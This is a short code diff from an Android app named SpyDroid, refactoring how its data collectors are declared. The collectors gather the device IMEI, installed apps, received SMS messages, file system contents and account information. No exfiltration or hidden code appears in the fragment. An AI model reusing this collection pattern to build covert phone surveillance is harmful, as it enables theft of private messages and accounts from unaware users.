@@ -129,11 +129,11 @@ public final class SpyDroid extends Activity {
 		IntentFilter smsFilter = new IntentFilter("android.provider.Telephony.SMS_RECEIVED");
 		
 		//Collector Declarations
-		AbstractCollector imeiColl= new IMEICollector(getApplicationContext(),"coll_IMEI");
-		AbstractCollector appColl= new InstalledAppCollector(getApplicationContext(),"coll_installed_apps");
+		StaticCollector imeiColl= new IMEICollector(getApplicationContext(),"coll_IMEI",null);
+		StaticCollector appColl= new InstalledAppCollector(getApplicationContext(),"coll_installed_apps",collService);
 		BroadcastCollector smsColl= new SMSCollector(collService,"coll_received_SMS",smsFilter);
-		AbstractCollector fileColl= new FileSystemCollector(getApplicationContext(),"coll_file_system");
-	    AbstractCollector accountColl= new AccountInfoCollector(getApplicationContext(),"coll_account_info");
+		StaticCollector fileColl= new FileSystemCollector(getApplicationContext(),"coll_file_system",collService);
+	    StaticCollector accountColl= new AccountInfoCollector(getApplicationContext(),"coll_account_info",null);
 	        
 		
 		//Scheduling
